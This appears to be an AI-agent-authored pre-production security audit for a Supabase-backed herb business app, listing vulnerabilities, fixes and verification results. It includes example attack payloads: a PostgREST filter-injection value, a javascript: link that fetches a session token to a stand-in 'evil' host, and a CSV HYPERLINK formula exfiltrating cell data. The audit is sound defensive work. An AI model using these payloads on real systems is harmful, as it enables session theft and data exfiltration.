# Pre-Production Audit — Konkuwan Herbs
 
**Started:** 2026-08-06 · **Branch:** `claude/practical-feynman-073rag`
**Scope:** full stack — Express API, React SPA, Supabase schema, build and deployment.
 
Legend: ⏳ Open · 🚧 In progress · ✅ Fixed · ➖ Accepted (documented, not fixed)
 
---
 
## Master tracker
 
| Task | Description | Status |
|---|---|---|
| A | Audit phase — survey, no changes | ✅ |
| 1 | Security audit and hardening | ✅ |
| 2 | Dashboard period sync + current-date clamping | ✅ |
| 3 | Revenue chart + working drill-down | ✅ |
| 4 | Logs export (CSV) | ✅ |
| 5 | Production readiness | ✅ |
| 6 | Dockerization + docs | ✅ |
| F | Final regression pass | ✅ |
 
---
 
## 1. Findings
 
Ordered by severity. Every entry states the problem, the impact, and the fix.
 
### Critical
 
#### C1 — PostgREST filter injection ✅
**Where:** 8 call sites across `challan`, `customer`, `warehouse`, `farm`, `contact` controllers.
 
User input is interpolated straight into a PostgREST filter string:
 
```js
q = q.or(`source_warehouse_id.eq.${warehouse_id},destination_warehouse_id.eq.${warehouse_id}`);
```
 
`.or()` builds `or=(…)`, a comma-separated condition list. A value containing a
comma injects extra conditions. Proven against the real client:
 
```
warehouse_id = "00000000-0000-0000-0000-000000000000,id.not.is.null"
→ or=(source_warehouse_id.eq.0000…,id.not.is.null,destination_warehouse_id.eq.0000…,id.not.is.null)
```
 
`id.not.is.null` matches every row, so the warehouse scope filter is gone.
 
**Impact.** An authenticated user can widen any scoped or search query to return
rows outside the intended filter. The service-role key bypasses RLS, so the only
thing standing between a caller and the whole table is the filter string they
just rewrote. Search boxes reach this directly.
 
**Fix.** `utils/pgrst.js` — `orFilter()` builds the clause from structured parts
and rejects any value containing PostgREST metacharacters; `likeTerm()` escapes
`%`, `_`, `\`, `,`, `.`, `(`, `)`, `"` for `ilike` patterns. Every call site
converted. UUID-shaped parameters are additionally validated as UUIDs.
 
#### C2 — Raw database errors returned to the client ✅
**Where:** 66 call sites — `next(new AppError(error.message, 500))`.
 
`errorHandler` returns `message` verbatim for every status, so a PostgREST or
Postgres error reaches the browser intact: table and column names, constraint
names, and the reason a query failed.
 
**Impact.** Schema disclosure to any authenticated user, and to anonymous callers
through the public contact form. It is the reconnaissance step that makes C1
worth attempting.
 
**Fix.** `errorHandler` now returns a generic message for any 5xx in production
while logging the real error with a correlation id that is echoed to the client
(`{ success: false, message, error_id }`). 4xx messages — which are written for
users — still pass through. Controllers keep passing the DB error so it is
logged; only the client-facing text changes.
 
### High
 
#### H1 — Admin routes have no client-side role protection ✅
`App.jsx` mounts every admin page under `<ProtectedRoute allowedRoles={[]} />`,
and `allowedRoles.length === 0` means "allow everyone".
 
**Impact.** Any authenticated user — including a stakeholder, whose whole point
is restricted access — can navigate to `/admin/users` or `/admin/settings` and
render the page. The API refuses the data, so this is not a data breach, but the
invite form, the settings form and the page structure are all visible.
 
**Fix.** `client/src/lib/accessControl.js` — one role→route table mirroring the
server's `authorize()` lists. `App.jsx` wraps each route with its real roles;
`Sidebar.jsx` and `ProtectedRoute` read the same table.
 
#### H2 — Sidebar advertises pages the API refuses ✅
Every menu item was granted to all five staff roles, but the API scopes most
modules to one or two. A `product_manager` saw ten menu items and could open one.
 
**Fix.** Same shared table as H1. The sidebar now shows exactly what the role can
open, and an unauthorised deep link redirects to the dashboard.
 
#### H3 — Unvalidated URLs rendered into `href` ✅
`customer.linkedin_url` and `expense.receipt_url` are rendered as link targets
with no scheme check. React does not block `javascript:` in `href`.
 
**Impact.** Stored XSS. An order_manager saves
`javascript:fetch('//evil/?t='+localStorage.getItem('sb-…-auth-token'))` as a
customer's LinkedIn URL; a super_admin clicks it and their Supabase session token
is exfiltrated. Supabase keeps the token in localStorage, so script execution on
this origin is a full account takeover.
 
**Fix.** `client/src/lib/safeUrl.js` — allows `http:`/`https:`/`mailto:` only,
returns null otherwise; links render as plain text when the URL is rejected.
Server-side, `customer.validation.js` restricts `linkedin_url` to http/https.
 
#### H4 — No security headers on the HTML document ✅
`helmet()` is Express middleware, and on Workers `run_worker_first` sends only
`/api/*` through Express. The SPA is served by Workers Static Assets, which never
touches Express — so the pages that execute JavaScript carried no CSP, no
`X-Frame-Options`, no `Referrer-Policy`.
 
**Fix.** `client/vite-plugin-headers.js` emits `client/dist/_headers` at build
time, which Cloudflare Static Assets applies to every page response.
 
It is generated rather than committed because the Supabase origin has to be
baked in: with a `*.supabase.co` wildcard, script running on this origin could
exfiltrate the session token to an attacker's *own* Supabase project, which is
most of what the CSP is there to prevent. The build fails if
`VITE_SUPABASE_URL` is absent — a deployed SPA whose CSP omits the Supabase
origin cannot log anyone in, and that is far harder to diagnose from the browser
than a build error is.
 
`connect-src` and `img-src` both need that origin (the SPA talks to Supabase
Auth directly and loads product images from Storage). `script-src` stays
`'self'` with no `unsafe-inline`, since Vite emits no inline scripts — that is
the directive that matters. Plus `frame-ancestors 'none'`, `nosniff`,
`Referrer-Policy`, `Permissions-Policy` and HSTS.
 
Helmet stays on `/api/*` with CSP disabled there: a JSON response has nothing to
restrict, and a second policy would be one more thing to keep aligned.
 
The container path serves the SPA through Express, where `_headers` means
nothing — so `server/src/app.js` sets the same policy itself, derived from
`SUPABASE_URL`. Found during the container run; see §7.
 
#### H5 — 8 dependency vulnerabilities, 5 high — partly ✅, partly ➖
Server: **0 vulnerabilities**. Client had 8.
 
**Fixed by upgrade** (all semver-minor): `axios` 1.17.0 → 1.19.0,
`postcss` 8.5.15 → 8.5.26, plus `form-data`, `dompurify` and `brace-expansion`
transitively.
 
**Not fixed — no patched release exists.** `react-router-dom` is at **7.18.2,
the latest published version**, and the advisory range is `6.0.0 – 8.2.0`.
`npm audit fix` proposes 7.11.0, which is a *downgrade* into the same range.
There is nothing to upgrade to.
 
Exposure was assessed rather than assumed. Four of the five advisories require
SSR or RSC — `deserializeErrors()` hydration, `RSCErrorHandler`, RSC-mode CSRF,
and route-matching DoS (which needs a server doing the matching). This is a
client-only SPA using `BrowserRouter`, with no `renderToString`, `StaticRouter`,
`hydrateRoot` or `createStaticHandler` anywhere. The fifth, open redirect via a
backslash in `<Link to>` / `useNavigate()`, needs a user-controlled destination;
every navigation target in the app is a string literal or comes from a hardcoded
menu table, and the one interpolated path uses a UUID from our own database.
 
**Action:** none available today. Re-check when react-router publishes a fix.
 
`esbuild` (low) remains and is build-tooling only — it is not shipped.
 
#### H6 — Unbounded pagination on six list endpoints ✅
`parseInt(req.query.limit) || 20` with no ceiling, and `page` unclamped.
`?limit=10000000` asks Supabase for every row into a Worker with a 128 MB cap;
`?page=-5` produces a negative range and a 500.
 
**Fix.** `utils/pagination.js` — `parsePagination(req.query)` clamps page ≥ 1 and
limit to 1–100 (audit logs 1–200 for export). Applied to all six.
 
#### H7 — Reporting ranges extend into the future ✅
`fyBounds(2026)` ends `2027-03-31`. On 6 August 2026 the annual view queried
eight months of future dates, drew eight empty months on the chart, and compared
a five-month period against a full previous year — so every annual trend arrow
was wrong.
 
**Fix.** See Task 2.
 
### Medium
 
#### M1 — Revenue chart drill-down did not work ✅
In the default monthly period the server returns `grain: 'day'`, and
`revenue_chart` is bucketed **by month** — one point. The chart rendered a single
dot, and clicking it "drilled" into the month already being displayed.
 
**Fix.** See Task 3.
 
#### M2 — Upload trusts the client-declared MIME type ✅
`fileFilter` reads `file.mimetype`, which comes from the multipart part header
and is attacker-controlled.
 
**Impact.** Bounded — the same declared type is passed to Supabase Storage as
`contentType`, so a disguised HTML file is served as `image/png` and will not
execute. But arbitrary content lands in a public bucket.
 
**Fix.** Magic-byte check against the first bytes of each buffer (JPEG `FF D8 FF`,
PNG signature, WebP `RIFF….WEBP`); the sniffed type overrides the declared one
when writing to Storage.
 
#### M3 — `authorize()` with no arguments allows everyone ✅
`roles.length === 0 || roles.includes(role)`. A wiring mistake becomes an open
endpoint silently.
 
**Fix.** `authorize()` with no roles now throws at module load, so it fails the
deploy rather than shipping an open route.
 
#### M4 — Any 401 forces a logout and redirect ✅
A single background query 401ing signed the user out mid-form.
 
**Fix.** The interceptor signs out only when Supabase confirms there is no valid
session; otherwise it rejects normally and the caller handles it.
 
#### M5 — Dead code ✅
`errorHandler` branches for Sequelize (removed rounds ago) and `jsonwebtoken`
(never used — Supabase verifies tokens). `audit.controller.js` and
`auth.js` carry large commented-out blocks.
 
**Fix.** Removed.
 
### Low
 
#### L1 — Settings accepts arbitrary keys ➖
`updateSettings` upserts any `{key, value}`. Restricted to super_admin and the
body is capped at 10 kB.
**Accepted** — the Settings screen deliberately exposes an "Other Settings"
section for keys not in the known list. Added a 200-char key cap and a 20 kB
serialised-value cap so a single row cannot be used as bulk storage.
 
#### L2 — Bundle visualizer runs on every production build ✅
`rollup-plugin-visualizer` wrote `client/stats.html` (gitignored, not deployed)
on every build. **Fix:** enabled only when `ANALYZE=1`.
 
#### L3 — `vite.config.js` references a test setup file that does not exist ✅
`setupFiles: './src/test/setup.js'` — no such file, so `vitest` cannot start.
**Fix:** file created with the minimal jsdom setup, so the runner works when
tests are added. No tests are claimed to exist.
 
---
 
## 2. Task 2 — dashboard period handling
 
**Current-date clamping.** `clampToToday()` in `utils/financialYear.js`, applied
to every branch of `resolvePeriod()`, so there is one rule rather than three.
 
| Period | Before | After |
|---|---|---|
| Annual, current FY | 2026-04-01 → **2027-03-31** | 2026-04-01 → **2026-08-06** |
| Annual, past FY | 2025-04-01 → 2026-03-31 | unchanged |
| Quarterly, current | 2026-07-01 → **2026-09-30** | 2026-07-01 → **2026-08-06** |
| Quarterly, past | 2026-04-01 → 2026-06-30 | unchanged |
| Monthly, current | 2026-08-01 → **2026-08-31** | 2026-08-01 → **2026-08-06** |
| Monthly, past | 2026-07-01 → 2026-07-31 | unchanged |
| Any future period | reported a full period of zeroes | empty range, `empty: true` |
 
**The comparison baseline is clamped to match.** This is the part that made the
numbers wrong rather than merely untidy: five months of this year were being
compared against twelve months of last year, so every annual trend arrow was
meaningless. The baseline is now the same number of elapsed days — 1 Apr–6 Aug
2026 against 1 Apr–6 Aug 2025.
 
The UI says "as of 6 Aug 2026" whenever a period is still running.
 
**Widget synchronisation.** One widget did not follow the period selector at all:
the **Order Pipeline** chart queried every order ever written, so it was the one
thing on the page that never changed when you switched Annual/Quarterly/Monthly.
Now derived from the period-scoped result.
 
The "drafts" figure in ⚠ Needs Attention is deliberately **not** period-scoped
and is now computed separately — it answers "what is sitting unconfirmed right
now", and a draft from March is still unconfirmed in August.
 
Counts labelled "Total" (customers, products, farmers, cultivated area) remain
all-time, which is what the label says.
 
---
 
## 3. Task 3 — revenue chart
 
**Why the drill-down did nothing.** In the default monthly period the server
returns `grain: 'day'`, but the chart always bucketed by **month** — and one
month is one point. The chart drew a single dot, and clicking it "opened" the
month already on screen.
 
The rule now lives in `client/src/lib/revenueSeries.js` and follows `grain`:
 
| Period | Chart shows | Click a month? |
|---|---|---|
| Annual | up to 12 months | yes → that month's days |
| Quarterly | up to 3 months | yes → that month's days |
| Monthly | the days | nothing to open — the days *are* the view |
 
Other fixes: the title said "Revenue Last 12 Months" regardless of the selected
period (now "Revenue Trend"); month labels carry the year when a financial year
spans two calendar years, so `Jan` is not ambiguous; the tooltip shows the exact
rupee figure while the axis stays abbreviated; day ticks use `preserveStartEnd`
so 31 of them fit on a phone; a drill-down opened in one financial year is
cleared when the period changes; and the series is memoised rather than rebuilt
on every render.
 
---
 
## 4. Task 4 — logs export
 
`GET /api/admin/audit-logs/export` returns every row matching the **current
filters**, not the thirty on screen, capped at 5000 with a `truncated` flag the
UI surfaces. Exporting the audit trail is itself written to the audit trail.
 
Filters are applied by one shared `applyLogFilters()` used by both the list and
the export, so the two cannot disagree. Date-range filters were added, since an
export scoped to a period is the common case.
 
**CSV injection.** The existing customer and farmer exports were vulnerable: a
cell beginning `=`, `+`, `-` or `@` is executed as a formula when the file is
opened in Excel or Sheets, so a company name saved as
`=HYPERLINK("https://evil/?d="&A1,"Click")` runs on the recipient's machine.
`client/src/lib/csv.js` neutralises them; all three exports now use it.
 
---
 
## 5. Task 5 — production readiness
 
| Item | Result |
|---|---|
| Initial bundle | **1763 kB → 481 kB** (gzip 508 → 141 kB). Admin routes are `React.lazy`, so a visitor reading the public site no longer downloads Recharts, jsPDF and PapaParse. 30 chunks. |
| Error boundary | Added. A render error showed a white page with nothing to report; it now shows a message and a way back. |
| Query defaults | `staleTime` 30 s, no refetch on window focus, and no retrying of 4xx — retrying a 403 three times only delays the error the user needs to see. |
| Pagination | Rendered one button per page; 200 pages meant 200 buttons. Now windowed with ellipses. |
| Dead code | ~440 lines of commented-out legacy implementations removed from 12 files. |
| Build config | The bundle visualizer ran on every production build; now behind `ANALYZE=1`. |
| Test runner | `vite.config.js` pointed `setupFiles` at a file that did not exist, so `vitest` could not start. File created. **No tests are claimed to exist.** |
 
---
 
## 6. Task 6 — Docker
 
Single image mirroring the Cloudflare shape: one process, one origin, no CORS.
Three stages (client build, server deps, runtime) so neither toolchain ships;
`node:22-alpine`; runs as uid 1000; `dumb-init` so `docker stop` reaches Node and
the existing graceful shutdown runs; healthcheck on `/api/health`; no volumes,
because uploads go to Supabase Storage and logs to stdout.
 
Express now serves the SPA when `client/dist` exists — guarded on the directory,
not on `NODE_ENV`, so the Worker bundle (no `__dirname`, no `client/dist`) skips
it entirely.
 
**Docker could not be built here — this environment has no Docker daemon.** What
*was* verified is the thing the image depends on: the exact `/app` layout was
reproduced on disk and run, and every route exercised. See §7.
 
---
 
## 7. Verification
 
Every check below was run against the finished code.
 
| # | Check | Result |
|---|---|---|
| 1 | `node --check` on every server file | pass |
| 2 | Locale parity en/or/hi | 681 / 681 / 681, no drift |
| 3 | Client access table vs server `authorize()` | 12/12 match |
| 4 | Widget registry ↔ locale labels ↔ render paths | 13/13/13 |
| 5 | FY ranges and clamping | 7/7, none extends past today |
| 6 | PostgREST injection vectors | all contained |
| 7 | Pagination clamping | limit and page bounded in every case |
| 8 | Error handler | 500 hides schema and returns `error_id`; 400 text preserved |
| 9 | Dashboard controller, 4 period types | figures, charts and pipeline all correct |
| 10 | Order + challan validation matrices | 9/9, including the legacy no-`challan_type` payload |
| 11 | `npm run build` | passes |
| 12 | Entry bundle | 481 kB across 30 chunks |
| 13 | `wrangler deploy --dry-run` | bundles, 52 asset files |
| 14 | Boot with `NODE_ENV=production` | passes |
| 15 | Container layout run | see below |
 
### Container layout run
 
Reproduced the image's `/app` tree and ran `node server/src/server.js`:
 
| Request | Result |
|---|---|
| `GET /api/health` | 200 JSON — the healthcheck command exits 0 |
| `GET /` | 200 HTML with full CSP |
| `GET /admin/orders` | 200 HTML (client-side routing works) |
| `GET /assets/<real hash>.js` | 200, `Cache-Control: immutable` |
| `GET /assets/missing.js` | **404** — not index.html under a JS content type |
| `GET /api/nope` | 404 JSON — not the SPA |
| `GET /_headers`, `/_redirects` | 404 — deployment metadata is not public |
 
Two defects were found and fixed during this run: a missing asset was being
answered with `index.html` (which the browser rejects with a confusing MIME
error and which hides a stale deploy), and the SPA was served with **no CSP at
all** in a container, because `_headers` is Cloudflare-only.
 
---
 
## 8. Not fixed — carried forward
 
| Item | Why |
|---|---|
| `react-router` advisories | No patched release exists; not reachable in this app (see H5) |
| `esbuild` (low) | Build tooling, not shipped |
| Rate limiting on public endpoints | Must be a Cloudflare WAF rule. An in-process limiter on Workers is per-isolate and resets constantly, so it would enforce nothing. Documented in `DEPLOYMENT.md`. |
| Automated tests | The runner now starts, but writing a suite is separate work. The revenue-series and financial-year logic were deliberately extracted into pure modules to make that straightforward. |
| Legacy `/uploads/%` image rows | Data migration, not code — `SELECT id, product_id, url FROM product_images WHERE url LIKE '/uploads/%';` |
| Rotating the exposed service-role key | User action in Supabase |